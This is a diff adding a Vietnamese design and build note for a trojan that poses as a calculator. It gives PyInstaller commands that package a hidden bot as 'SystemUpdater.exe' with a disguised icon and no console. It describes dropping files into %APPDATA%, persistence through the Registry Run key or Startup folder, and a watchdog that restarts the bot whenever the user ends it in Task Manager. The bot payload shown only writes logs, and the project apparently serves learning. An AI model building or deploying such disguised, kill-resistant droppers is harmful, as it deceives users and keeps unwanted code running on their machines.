@@ -1,0 +1,114 @@
+Ở Phiên bản này watchdog sẽ được tách riêng để khi kill tiến trình trong TaskManager nó sẽ tự khởi động lại
+
+====================================Đóng gói============================================================================
+   Đóng gói bot_test_V3.py:
+pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil bot_test_V3.py
+copy dist\bot_test_V3.exe SystemUpdater.exe
+
+    Đóng gói watchdog.py:
+pyinstaller --noconsole --onefile --icon=watchdog.ico --hidden-import=psutil watchdog.py
+copy dist\watchdog.exe watchdog.exe
+
+    Đóng gói calculator_trojan_V3.py:
+pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --add-data "watchdog.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V3.py
+
+======================================Tổng quan Các Thành Phần==========================================================================
+1) calculator_trojan_V3.py:
+    Đây là file chính, khởi động giao diện calculator (GUI) và chịu trách nhiệm triển khai bot (SystemUpdater.exe) và watchdog (watchdog.exe).
+    Tạo persistence (Registry/Startup) để đảm bảo watchdog.exe tự chạy sau khi khởi động máy.
+    Có cơ chế tự hủy để dọn dẹp khi thoát.
+2) bot_test_V3.py (đóng gói thành SystemUpdater.exe):
+    Đây là bot thực hiện nhiệm vụ chính, chạy ngầm và ghi log định kỳ.
+    Không còn chứa watchdog() (đã tách ra).
+3) watchdog.py (đóng gói thành watchdog.exe):
+    Độc lập, giám sát SystemUpdater.exe và khởi động lại nếu bot bị kill.
+    Ghi log riêng để theo dõi hoạt động.
+=======================================Luồng dữ liệu=========================================================================
+1) Khởi động chương trình
+Người dùng chạy calculator_trojan_V3.exe (được đóng gói từ calculator_trojan_V3.py).
+    Kiểm tra single instance:
+        File pid_file (%APPDATA%\calculator.pid) được tạo để lưu PID của tiến trình hiện tại.
+        Nếu pid_file đã tồn tại và PID trong file vẫn đang chạy, chương trình thoát ngay.
+        Dữ liệu: PID của tiến trình được ghi vào %APPDATA%\calculator.pid.
+    Cấu hình logging:
+        File log trojan.log được tạo tại %APPDATA%\trojan.log.
+        Dữ liệu: Các thông báo log từ calculator_trojan_V3.py được ghi vào đây.
+    Khởi động thread drop_bot():
+        Trong if __name__ == "__main__":, một thread chạy drop_bot() được khởi động (daemon thread).
+        Copy file SystemUpdater.exe và watchdog.exe:
+            drop_bot() kiểm tra và copy SystemUpdater.exe và watchdog.exe từ thư mục hiện tại (C:\TrojanFiles) sang %APPDATA%.
+            Dữ liệu: File SystemUpdater.exe và watchdog.exe được copy vào %APPDATA%.
+            Log: Ghi thông báo "Đã copy..." vào trojan.log.
+        Dừng tiến trình cũ:
+            Sử dụng psutil.process_iter() để tìm các tiến trình SystemUpdater.exe và watchdog.exe.
+            Gọi proc.kill() để dừng các tiến trình cũ.
+            Dữ liệu: PID của các tiến trình bị kill được ghi vào log trojan.log.
+        Khởi động bot và watchdog:
+            Dùng subprocess.Popen([BOT_PATH], creationflags=subprocess.DETACHED_PROCESS) để chạy SystemUpdater.exe.
+            Dùng subprocess.Popen([WATCHDOG_PATH], creationflags=subprocess.DETACHED_PROCESS) để chạy watchdog.exe.
+            Dữ liệu: Không có dữ liệu trực tiếp truyền qua subprocess, nhưng các tiến trình mới được khởi động.
+            Log: Ghi thông báo "Bot đã được chạy từ..." và "Watchdog đã được chạy từ..." vào trojan.log.
+        Thiết lập persistence:
+            Trong setup_persistence(), drop_bot() thêm watchdog.exe vào Registry (HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run) hoặc Startup folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup).
+            Dữ liệu: Đường dẫn %APPDATA%\watchdog.exe được ghi vào Registry hoặc tạo shortcut SystemUpdater.lnk.
+            Log: Ghi thông báo "Đã thêm watchdog vào Registry..." vào trojan.log.
+        Chạy GUI calculator:
+            Hàm run_calculator() tạo giao diện calculator với các chức năng cơ bản (cộng, trừ, nhân, chia, memory).
+            Dữ liệu: Các phép tính do người dùng nhập được xử lý trong GUI (không liên quan đến bot/watchdog).
+            Log: Nếu có lỗi tính toán, ghi vào trojan.log.
+2) Hoạt động của bot (SystemUpdater.exe)
+    Khởi động bot:
+        SystemUpdater.exe (được tạo từ bot_test_V3.py) chạy ngầm với DETACHED_PROCESS.
+        Cấu hình logging:
+            File log system_log.txt được tạo tại %APPDATA%\system_log.txt.
+            Dữ liệu: Các thông báo log từ bot được ghi vào đây.
+        Chạy main_task():
+            Vòng lặp vô hạn trong main_task() in thông báo "[MAIN_TASK] Bot đang chạy bình thường" mỗi 30 giây.
+            Dữ liệu: Không có dữ liệu đầu vào/đầu ra trực tiếp, chỉ ghi log định kỳ.
+            Log: Ghi "[MAIN_TASK] Bot đang chạy bình thường" vào system_log.txt.
+3) Hoạt động của watchdog (watchdog.exe)
+    Khởi động watchdog:
+        watchdog.exe (được tạo từ watchdog.py) chạy ngầm với DETACHED_PROCESS.
+    Cấu hình logging:
+        File log watchdog_log.txt được tạo tại %APPDATA%\watchdog_log.txt.
+        Dữ liệu: Các thông báo log từ watchdog được ghi vào đây.
+    Chạy vòng lặp watchdog():
+        Kiểm tra file tín hiệu dừng (%APPDATA%\stop_bot.txt) mỗi 20 giây.
+        Sử dụng psutil.process_iter() để tìm tiến trình SystemUpdater.exe.
+        Dữ liệu: Không có dữ liệu đầu vào/đầu ra trực tiếp, chỉ kiểm tra trạng thái tiến trình.
+        Log: Ghi "[WATCHDOG] Tìm thấy bot đang chạy với PID: ..." vào watchdog_log.txt.
+    Khởi động lại bot nếu cần:
+        Nếu không tìm thấy SystemUpdater.exe, gọi stop_existing_bots() để dừng các tiến trình cũ (nếu có).
+        Dùng subprocess.Popen([BOT_PATH], creationflags=subprocess.DETACHED_PROCESS) để khởi động lại SystemUpdater.exe.
+        Dữ liệu: Không có dữ liệu truyền trực tiếp, chỉ khởi động tiến trình mới.
+        Log: Ghi "[WATCHDOG] Bot không chạy, đang khởi động lại..." và "[WATCHDOG] Đã khởi động bot với PID: ..." vào watchdog_log.txt.
+4) End Task và Khởi động lại
+    Người dùng end task SystemUpdater.exe:
+        Tiến trình SystemUpdater.exe bị dừng, nhưng watchdog.exe vẫn chạy (vì là tiến trình độc lập).
+    Watchdog phát hiện và khởi động lại:
+        Sau tối đa 20 giây, watchdog() nhận thấy không còn tiến trình SystemUpdater.exe.
+        Gọi stop_existing_bots() (không cần thiết vì tiến trình đã bị kill).
+        Khởi động lại SystemUpdater.exe bằng subprocess.Popen.
+        Dữ liệu: Không có dữ liệu truyền trực tiếp, chỉ khởi động tiến trình mới.
+        Log: Ghi "[WATCHDOG] Bot không chạy, đang khởi động lại..." vào watchdog_log.txt.
+5) Tự hủy khi thoát
+    Người dùng nhấn "Exit" trên GUI calculator:
+        Hàm button_exit() gọi cleanup().
+    Tạo file tín hiệu dừng:
+        File stop_bot.txt được tạo tại %APPDATA%\stop_bot.txt.
+        Dữ liệu: Nội dung "stop" được ghi vào file.
+        Log: Ghi "Đã tạo file tín hiệu dừng." vào trojan.log.
+    Dừng các tiến trình:
+        Sử dụng psutil.process_iter() để tìm và kill SystemUpdater.exe và watchdog.exe.
+        Dữ liệu: PID của các tiến trình bị kill được ghi vào log.
+        Log: Ghi "Đã dừng SystemUpdater.exe với PID: ..." vào trojan.log.
+    Dọn dẹp file:
+        Đóng bot_file_handle (nếu có).
+        Xóa mục Registry và shortcut trong Startup folder.
+        Xóa các file: SystemUpdater.exe, watchdog.exe, trojan.log, system_log.txt, watchdog_log.txt, stop_bot.txt.
+        Dữ liệu: Các file bị xóa khỏi hệ thống.
+        Log: Ghi "Đã xóa..." vào trojan.log (cho đến khi file log bị xóa).
+6) Khởi động lại máy
+    Nếu watchdog.exe đã được thêm vào Registry hoặc Startup folder, nó sẽ tự chạy sau khi khởi động máy.
+    watchdog.exe sẽ kiểm tra và khởi động SystemUpdater.exe nếu không tìm thấy.
+    Dữ liệu: Tương tự như luồng khởi động ban đầu của watchdog.exe.
